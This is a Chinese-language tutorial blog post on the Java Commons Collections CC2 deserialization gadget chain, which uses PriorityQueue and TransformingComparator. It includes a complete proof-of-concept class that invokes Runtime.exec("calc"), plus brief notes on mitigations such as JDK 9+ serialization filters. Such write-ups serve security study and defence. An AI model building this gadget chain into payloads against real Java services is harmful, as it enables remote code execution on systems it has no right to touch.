---
title: "Java CC · CC2：PriorityQueue 与 Commons Collections 4.x"
series: java-cc-deserialization
series_order: 3
date: 2026-04-25 10:00:00 +0800
categories:
  - javaCC
---
# CC2：PriorityQueue 入口与 4.x 适配


### 为什么需要 CC2？
CC1 链主要依赖 `commons-collections:3.x`。然而，Apache 同时维护着 `commons-collections4:4.x` 分支，两者的包名存在差异。更重要的是，CC4.x 中 `TransformingComparator` 实现了 `Serializable` 接口，这为新的攻击入口提供了可能。CC2 正是利用 `PriorityQueue` 作为入口，适配了 CC 4.x 版本。

### 核心原理
CC2 的核心在于利用 `PriorityQueue` 的反序列化机制。`PriorityQueue` 在反序列化时需要重建堆结构，这个过程会调用 `Comparator.compare()` 方法。若我们将 `Comparator` 设为 `TransformingComparator`，其 `compare()` 方法会调用 `transform()`，从而触发攻击链。

**调用链：**
```text
PriorityQueue.readObject()
  → heapify()
  → siftDown()
  → siftDownUsingComparator()
  → comparator.compare(o1, o2)
    → TransformingComparator.compare()
      → transformer.transform(o1)
        → ChainedTransformer/InvokerTransformer...
```

### 完整 POC
构造时需要注意，`PriorityQueue` 在 `add` 时也会触发比较逻辑，因此需要先用假链构造，再反射替换真链。

```java
package com.nk7;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsCollections2 {
    public static void main(String[] args) throws Exception {
        // 1. 构造恶意 Transformer 链
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] realTransformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Comparator comparator = new TransformingComparator(transformerChain);

        // 2. 构造 PriorityQueue 入口
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);

        // 3. 反射替换真链
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, realTransformers);

        serialize(queue);
        unserialize("ser.bin");
    }
    // serialize/unserialize 方法省略
}
```

### 绕过与防护分析
CC2 的出现主要是为了适配 CC 4.x。针对 CC2 的防护，CC 4.1 版本尝试移除了 `InvokerTransformer` 的序列化能力，但这并不能完全阻止攻击，攻击者可以结合后续 CC3 的思路进行绕过。在 JDK 层面，JDK 8u71 修复了 `AnnotationInvocationHandler`，这对 CC2 没有影响，因为 CC2 使用的是 `PriorityQueue` 入口。最有效的防护依然是 JDK 9+ 引入的序列化过滤器。
